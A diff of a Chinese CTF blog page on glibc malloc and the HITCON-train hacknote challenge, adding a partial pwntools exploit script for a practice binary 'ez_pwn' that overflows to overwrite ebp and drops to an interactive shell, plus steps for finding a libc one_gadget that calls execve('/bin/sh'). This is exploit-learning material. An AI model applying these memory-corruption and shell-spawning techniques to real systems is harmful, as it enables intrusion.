@@ -144,7 +144,7 @@
     <link rel="alternate" type="application/atom+xml" href="/atom.xml"><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="wtf"><meta name="msapplication-starturl" content="http://im0use.github.io"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="wtf"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 
     <!-- ### The Open Graph & Twitter Card Protocol ### -->
-    <meta property="og:title" content="HITCON-train-hacknote | wtf"><meta property="og:site_name" content="wtf"><meta property="og:type" content="article"><meta property="og:url" content="http://im0use.github.io/2022/05/18/HITCON-train-hacknote/"><meta property="og:locale" content="zh-CN"><meta name="description" content="一个写笔记的程序，下面是程序的一些功能。 12345678910111213141516171819202122232425262728293031323334$ .&#x2F;hacknote ----------------------       HackNote       ---------------------- 1. Add note           2. Delete note     - wtfff - wtf"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/iM0use/img-hosting@master/20220518/image-20220518230240720.3pwbksljbeo0.webp"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/iM0use/img-hosting@master/20220518/image-20220518225637309.1vf5jk0s4wbk.webp"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/iM0use/img-hosting@master/20220518/image-20220518231006560.33g13n7oknc0.webp"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/iM0use/img-hosting@master/20220518/image-20220518231653721.tp8j0nbjh9c.webp"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/iM0use/img-hosting@master/20220518/image-20220518232149688.8u5iweyyjt4.webp"><meta property="article:published_time" content="2022-05-18T14:43:16.000Z"><meta property="article:modified_time" content="2022-05-18T15:25:49.925Z"><meta property="og:updated_time" content="2022-05-18T15:25:49.925Z"><meta property="article:author" content="wtfff"><meta name="twitter:card" content="summary">
+    <meta property="og:title" content="HITCON-train-hacknote | wtf"><meta property="og:site_name" content="wtf"><meta property="og:type" content="article"><meta property="og:url" content="http://im0use.github.io/2022/05/18/HITCON-train-hacknote/"><meta property="og:locale" content="zh-CN"><meta name="description" content="一个写笔记的程序，下面是程序的一些功能。 12345678910111213141516171819202122232425262728293031323334$ .&#x2F;hacknote ----------------------       HackNote       ---------------------- 1. Add note           2. Delete note     - wtfff - wtf"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/iM0use/img-hosting@master/20220518/image-20220518230240720.3pwbksljbeo0.webp"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/iM0use/img-hosting@master/20220518/image-20220518225637309.1vf5jk0s4wbk.webp"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/iM0use/img-hosting@master/20220518/image-20220518231006560.33g13n7oknc0.webp"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/iM0use/img-hosting@master/20220518/image-20220518231653721.tp8j0nbjh9c.webp"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/iM0use/img-hosting@master/20220518/image-20220518232149688.8u5iweyyjt4.webp"><meta property="article:published_time" content="2022-05-18T14:43:16.000Z"><meta property="article:modified_time" content="2022-05-22T15:34:50.903Z"><meta property="og:updated_time" content="2022-05-22T15:34:50.903Z"><meta property="article:author" content="wtfff"><meta name="twitter:card" content="summary">
 
     
 
@@ -185,7 +185,7 @@
     },
     
     "datePublished": "2022-05-18T14:43:16.000Z",
-    "dateModified": "2022-05-18T15:25:49.925Z",
+    "dateModified": "2022-05-22T15:34:50.903Z",
     "author": {
         "@type": "Person",
         "name": "wtfff",
@@ -522,7 +522,7 @@ mjx-container[display="true"] + br {
                     
                         
                         
-                            <div id="post-toc"><ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Mechanism-of-glibc-malloc"><span class="post-toc-number">1.</span> <span class="post-toc-text">Mechanism of glibc malloc</span></a></li></ol></div>
+                            <div id="post-toc"><ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#The-workflow-of-malloc"><span class="post-toc-number">1.</span> <span class="post-toc-text">The workflow of malloc</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Mechanism-of-glibc-malloc"><span class="post-toc-number">2.</span> <span class="post-toc-text">Mechanism of glibc malloc</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#one-gadget"><span class="post-toc-number">3.</span> <span class="post-toc-text">one_gadget</span></a></li></ol></div>
                         
                     
                     <article id="post-content">
@@ -533,8 +533,7 @@ mjx-container[display="true"] + br {
 
 <p>因为想去弄懂一些细节，所以在GitHub上搜到了源代码。</p>
 <p>顺便看看并总结angelboy大神的幻灯片，分享收获。</p>
-<p>The workflow of malloc</p>
-<ul>
+<h2 id="The-workflow-of-malloc"><a href="#The-workflow-of-malloc" class="headerlink" title="The workflow of malloc"></a>The workflow of malloc</h2><ul>
 <li>第一次执行 malloc</li>
 </ul>
 <p><img src="https://cdn.jsdelivr.net/gh/iM0use/img-hosting@master/20220518/image-20220518230240720.3pwbksljbeo0.webp" alt="image-20220518230240720"></p>
@@ -615,6 +614,24 @@ mjx-container[display="true"] + br {
 </ul>
 </li>
 </ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">l</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">12</span>):</span><br><span class="line">        add(-<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    add(<span class="number">11</span>)</span><br><span class="line">    add(<span class="number">13</span>)</span><br><span class="line">    add(-<span class="number">1</span>)</span><br><span class="line">    add(-<span class="number">1</span>)</span><br><span class="line">    add(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">l()<span class="comment"># 覆盖ebp</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">path = <span class="string">'./ez_pwn'</span></span><br><span class="line">elf = ELF(path)</span><br><span class="line">io = elf.process()</span><br><span class="line">menu = <span class="keyword">lambda</span> x:io.sendlineafter(<span class="string">b'input your choice:'</span>, <span class="built_in">str</span>(x).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b'input the length of array:'</span>, <span class="string">b'-1'</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">num</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b'input num'</span>, <span class="built_in">str</span>(num).encode())</span><br><span class="line">    <span class="comment"># io.recv()</span></span><br><span class="line">    <span class="comment"># io.sendline(b'1')</span></span><br><span class="line">    <span class="comment"># io.recv()</span></span><br><span class="line">    <span class="comment"># io.sendline(b'-1')</span></span><br><span class="line">    <span class="comment"># menu(1)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getsum</span>():</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getavg</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">l</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">12</span>):</span><br><span class="line">        add(-<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    add(<span class="number">11</span>)</span><br><span class="line">    add(<span class="number">13</span>)</span><br><span class="line">    add(-<span class="number">1</span>)</span><br><span class="line">    add(-<span class="number">1</span>)</span><br><span class="line">    add(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">l()</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># add(15)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># add(15)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># add(-1)</span></span><br><span class="line"><span class="comment"># menu(1)</span></span><br><span class="line"><span class="comment"># io.sendlineafter(b'input num', b'-1')</span></span><br><span class="line"><span class="comment"># menu(1)</span></span><br><span class="line"><span class="comment"># io.sendlineafter(b'input num', b'-1')</span></span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># _libc_main_got = 134529052</span></span><br><span class="line"><span class="comment"># add(_libc_main_got)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># getsum()</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()<span class="comment"># b *hackme + 202 main: 0xf7d43de0</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><ul>
+<li>strings</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-&gt; strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh</span><br><span class="line">  18ac40 /bin/sh</span><br><span class="line">&amp;<span class="string">"/bin/sh"</span>: 0x18ac40</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用 objdump 打开 libc.so.6</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d libc.so.6 | grep 18ac40 -A 7 -B 3</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">45575:		call		35a60 &lt;sigprocmask@@GLIBC_2.2.5&gt;</span><br><span class="line">4557a:		mov			rax, QWORD PTR [rip+0x37b937]</span><br><span class="line">45581:		lea			rdi,[rip+0x1456b8]			<span class="comment"># 18ac40</span></span><br><span class="line">45588:		lea			rsi,[rsp+0x30]</span><br><span class="line">4558d:		mov			DWORD PTR [rip+0x37dee9],0x0</span><br><span class="line">45597:		mov			DWORD PTR [rip+0x37dee3],0x0</span><br><span class="line">455a1:		mov			rdx,QWORD PTR [rax]</span><br><span class="line">455a4:		call		cd760 &lt;execve@@GLIBC_2.2.5&gt;</span><br></pre></td></tr></table></figure>
+
+<p>One Gadget: 0x4557a</p>
+<p>execve(“/bin/sh”, rsp+0x30, environ);</p>
 
                     </article>
                     
@@ -636,7 +653,7 @@ mjx-container[display="true"] + br {
     <blockquote id="date-expire-notification" class="post-expired-notify">本文最后更新于 <span id="date-expire-num"></span> 天前，文中所描述的信息可能已发生改变</blockquote>
     <script>
     (function() {
-        var dateUpdate = Date.parse("2022-05-18");
+        var dateUpdate = Date.parse("2022-05-22");
         var nowDate = new Date();
         var a = nowDate.getTime();
         var b = a - dateUpdate;
@@ -651,6 +668,8 @@ mjx-container[display="true"] + br {
 
 
 <p class="post-footer-info mb-0 pt-0">本文发表于&nbsp;<time datetime="2022-05-18T14:43:16.000Z" itemprop="datePublished">2022-05-18</time>
+
+    , 最后修改于&nbsp;<time datetime="2022-05-22T15:34:50.903Z" itemprop="dateModified">2022-05-22</time>
 
 </p>
 <p class="post-footer-info mb-0 pt-2">
@@ -676,9 +695,9 @@ mjx-container[display="true"] + br {
     <!-- Next Nav -->
     
         <li class="page-item page-next">
-            <a href="/2022/05/18/blog-newcomer/" rel="next">
+            <a href="/2022/05/18/Dest0g3-begin/" rel="next">
                 <div class="page-item-title"><i class="icon icon-forward" aria-hidden="true"></i></div>
-                <div class="page-item-subtitle">blog-newcomer</div>
+                <div class="page-item-subtitle">Dest0g3-begin</div>
             </a>
         </li>
     
